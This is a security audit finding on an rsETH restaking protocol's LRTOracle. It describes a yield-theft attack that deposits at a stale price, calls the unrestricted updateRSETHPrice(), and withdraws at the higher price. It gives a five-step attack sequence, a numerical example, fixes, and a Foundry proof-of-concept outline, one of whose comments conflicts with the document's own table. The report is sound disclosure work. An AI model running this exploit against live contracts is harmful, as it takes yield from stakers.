Audit Report

## Title
Yield Theft via Permissionless `updateRSETHPrice()` Enabling Deposit-Before-Update Sandwich - (File: contracts/LRTOracle.sol)

## Summary

`LRTOracle.updateRSETHPrice()` carries no access control, allowing any caller to trigger a price update at will. An attacker can deposit at a stale low `rsETHPrice`, immediately call `updateRSETHPrice()` to reflect accrued rewards, then initiate a withdrawal at the elevated price — locking in a payout that exceeds their deposit. The profit is extracted from yield that belongs to existing rsETH holders.

## Finding Description

**Root cause — `updateRSETHPrice()` is unrestricted:**

`contracts/LRTOracle.sol` L87–89 exposes the price update to any caller:

```solidity
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

The manager-gated variant at L94–96 (`updateRSETHPriceAsManager`) exists but is not enforced for the public path.

**Deposit minting uses the current (stale) `rsETHPrice`:**

`contracts/LRTDepositPool.sol` L519–520:
```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```
A stale low `rsETHPrice` inflates the rsETH minted per unit of deposited asset.

**`_updateRsETHPrice()` raises the price when rewards have accrued:**

`contracts/LRTOracle.sol` L234, L244–250:
```solidity
uint256 previousTVL = rsethSupply.mulWad(rsETHPrice);
...
if (!protocolPaused && totalETHInProtocol > previousTVL) { ... }
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```
After the attacker's deposit increases `rsethSupply`, the new price reflects the pre-existing reward diluted across the larger supply — but the attacker's rsETH was minted at the old lower price, so they hold more rsETH than their proportional share warrants.

**Withdrawal `expectedAssetAmount` is locked at initiation-time price:**

`contracts/LRTWithdrawalManager.sol` L168, L593:
```solidity
uint256 expectedAssetAmount = getExpectedAssetAmount(asset, rsETHUnstaked);
// ...
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
```
This amount is stored in `withdrawalRequests` at L751–753.

**`_calculatePayoutAmount` caps payout at `min(expectedAssetAmount, currentReturn)`:**

`contracts/LRTWithdrawalManager.sol` L833–834:
```solidity
uint256 currentReturn = (request.rsETHUnstaked * rsETHPrice) / assetPrice;
return (request.expectedAssetAmount < currentReturn) ? request.expectedAssetAmount : currentReturn;
```
As long as the price does not fall below the initiation price before `unlockQueue` is called, the attacker receives the full `expectedAssetAmount` locked in at the elevated post-update price.

**The `pricePercentageLimit` guard is insufficient:**

L256–266 of `LRTOracle.sol` only reverts a non-manager caller when the price increase *exceeds* `pricePercentageLimit`. If `pricePercentageLimit == 0` (the default until explicitly set), the check is entirely bypassed (`pricePercentageLimit > 0 &&`). Even when set, the attack succeeds for any reward accrual within the configured limit — which is the normal, expected case every reward cycle.

**Complete attack sequence (no front-running, no privileges required):**

1. Observe on-chain: `totalETHInProtocol > rsethSupply × rsETHPrice` (rewards accrued, price stale).
2. Call `LRTDepositPool.depositETH{value: X}(0, "")` — minted rsETH is inflated because `rsETHPrice` is stale.
3. Call `LRTOracle.updateRSETHPrice()` — price jumps to reflect accrued rewards.
4. Call `LRTWithdrawalManager.initiateWithdrawal(ETH, rsETHAmount, "")` — `expectedAssetAmount` is locked at the new higher price.
5. After `withdrawalDelayBlocks` (~8 days), operator calls `unlockQueue` (routine operation), then attacker calls `completeWithdrawal` — receives `expectedAssetAmount > deposited ETH`.

**Numerical verification:**

| State | rsETH Supply | TVL (ETH) | rsETHPrice |
|---|---|---|---|
| Before rewards | 1,000 | 1,000 | 1.000 |
| After rewards accrue | 1,000 | 1,010 | 1.000 (stale) |
| Attacker deposits 1,000 ETH | 2,000 | 2,010 | 1.000 (stale) |
| After `updateRSETHPrice()` | 2,000 | 2,010 | **1.005** |
| Attacker withdraws 1,000 rsETH | — | — | receives **1,005 ETH** |

Attacker profit: **5 ETH**. Existing stakers receive 1,005 ETH instead of 1,010 ETH — **5 ETH of yield stolen**.

## Impact Explanation

**High — Theft of unclaimed yield.** Existing rsETH holders lose a portion of every reward cycle proportional to the attacker's deposit size relative to total supply. The attack is repeatable on every reward distribution event. The attacker recovers their principal plus a share of accrued rewards, while legitimate long-term stakers receive diluted yield. This maps directly to the allowed impact class "High. Theft of unclaimed yield."

## Likelihood Explanation

**Medium.** The attacker requires only: (1) capital to deposit (recoverable after ~8 days), (2) ability to monitor on-chain state for reward accrual (trivially observable via `getTotalAssetDeposits` vs. `rsETHPrice × totalSupply`), and (3) willingness to wait for the withdrawal delay. No privileged access, no oracle manipulation, no front-running of other users, and no external protocol compromise is required. The attacker controls the entire sequence. The attack is economically rational whenever accrued rewards × (attacker deposit / total TVL) exceed opportunity cost of capital over 8 days.

## Recommendation

1. **Restrict `updateRSETHPrice()`** to a permissioned role, matching the existing `updateRSETHPriceAsManager()` pattern. The public function serves no purpose that the manager-gated variant does not already cover.

2. **Alternatively**, enforce a minimum deposit holding period before a withdrawal can be initiated, preventing same-block or same-transaction deposit-then-withdraw sequences.

3. **Ensure `pricePercentageLimit` is always set to a non-zero value** as a defense-in-depth measure, and document that `0` disables the guard entirely.

```solidity
pragma solidity ^0.8.0;

// Foundry fork test outline
// 1. Fork mainnet at a block where rewards have accrued (totalETHInProtocol > rsethSupply * rsETHPrice)
// 2. Impersonate attacker EOA with 1000 ETH

// Step 1: Record pre-attack state
uint256 priceBefore = lrtOracle.rsETHPrice();
uint256 supplyBefore = rsETH.totalSupply();

// Step 2: Deposit at stale low price
lrtDepositPool.depositETH{value: 1000 ether}(0, "attack");
uint256 rsETHReceived = rsETH.balanceOf(attacker); // > 1000e18 / priceBefore if price is stale

// Step 3: Trigger price update — public, no access control
lrtOracle.updateRSETHPrice();
uint256 priceAfter = lrtOracle.rsETHPrice();
assert(priceAfter > priceBefore); // price increased due to accrued rewards

// Step 4: Lock in withdrawal at elevated price
rsETH.approve(address(lrtWithdrawalManager), rsETHReceived);
lrtWithdrawalManager.initiateWithdrawal(ETH_TOKEN, rsETHReceived, "attack");
// expectedAssetAmount = rsETHReceived * priceAfter / 1e18 > 1000 ETH

// Step 5: Advance blocks past withdrawalDelayBlocks (~57,600 blocks)
vm.roll(block.number + 57_601);

// Step 6: Operator unlocks queue (routine operation)
vm.prank(operator);
lrtWithdrawalManager.unlockQueue(ETH_TOKEN, type(uint256).max, 0, type(uint256).max, 0, type(uint256).max);

// Step 7: Complete withdrawal
uint256 ethBefore = attacker.balance;
lrtWithdrawalManager.completeWithdrawal(ETH_TOKEN, "attack");
uint256 profit = attacker.balance - ethBefore - 1000 ether;
assert(profit > 0); // attacker received more ETH than deposited
```
